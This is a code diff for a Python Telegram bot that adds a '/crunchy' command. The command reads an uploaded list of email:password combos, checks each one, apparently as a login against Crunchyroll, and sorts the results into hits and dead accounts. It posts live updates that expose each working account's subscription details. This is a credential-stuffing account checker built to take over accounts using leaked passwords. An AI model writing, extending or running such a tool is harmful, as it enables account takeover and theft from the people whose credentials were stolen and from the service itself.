@@ -213,7 +213,76 @@ def callback_query(call):
         pass  # Do nothing
    
 
-@rkup=markup,
+@bot.message_handler(commands=['crunchy'])
+def crunchy_command(message):
+    if message.reply_to_message and message.reply_to_message.document:
+        if message.reply_to_message.document.mime_type == 'text/plain':
+            file_info = bot.get_file(message.reply_to_message.document.file_id)
+            downloaded_file = bot.download_file(file_info.file_path)
+            file_content = downloaded_file.decode('utf-8')
+
+            chat_id = message.chat.id
+            username = message.from_user.username
+
+            # Start a new thread to handle the file processing
+            threading.Thread(target=process_crunchy, args=(chat_id, username, file_content)).start()
+        else:
+            bot.reply_to(message, "Please reply to a valid txt file.")
+    else:
+        bot.reply_to(message, "Please reply to a txt file with the /crunchy command.")
+
+def process_crunchy(chat_id, username, file_content):
+    total_accounts = file_content.splitlines()
+    start_time = time.time()  # Start time right before processing
+
+    hits = []
+    dead = []
+
+    initial_message = "Checking Your Accounts...\n\n"
+    footer_info = crunchy_footer_info(len(total_accounts), start_time, username)  # Updated alias name
+
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton(f"Hit ✅: 0", callback_data=f"{chat_id}:hit"))
+    markup.add(types.InlineKeyboardButton(f"Dead ❌: 0", callback_data=f"{chat_id}:dead"))
+
+    msg = bot.send_message(chat_id, initial_message + footer_info, reply_markup=markup, parse_mode='HTML')
+
+    for account in total_accounts:
+        email, password = account.split(":", 1)
+        result, response_message = check_crunchy(email, password)
+        if result == 'Hit':
+            hits.append(f"<code>{account}</code>")
+        else:
+            dead.append(f"<code>{account}</code>")
+
+        chat_data[chat_id] = {
+            'hits': hits,
+            'dead': dead,
+            'total_accounts': len(total_accounts)
+        }
+
+        live_update = (
+            f"↯ CRUNCHY CHECKER\n\n"
+            f"➣Combo: {account}\n"
+            f"➣Result: {result}\n"
+            f"➣Response: {response_message}\n"
+            f"➣Email Verified: {response_message.get('email_verified', 'N/A')}\n"
+            f"➣Account Creation Date: {response_message.get('account_creation_date', 'N/A')}\n"
+            f"➣Subscription Name: {response_message.get('subscription_name', 'N/A')}\n"
+            f"➣Currency: {response_message.get('currency', 'N/A')}\n"
+            f"➣Subscription Amount: {response_message.get('subscription_amount', 'N/A')}\n\n"
+            f"{footer_info}"
+        )
+
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton(f"Hit ✅: {len(hits)}", callback_data=f"{chat_id}:hit"))
+        markup.add(types.InlineKeyboardButton(f"Dead ❌: {len(dead)}", callback_data=f"{chat_id}:dead"))
+
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=msg.message_id,
+            text=live_update,
+            reply_markup=markup,
             parse_mode='HTML'  # Enable HTML parsing
         )
 
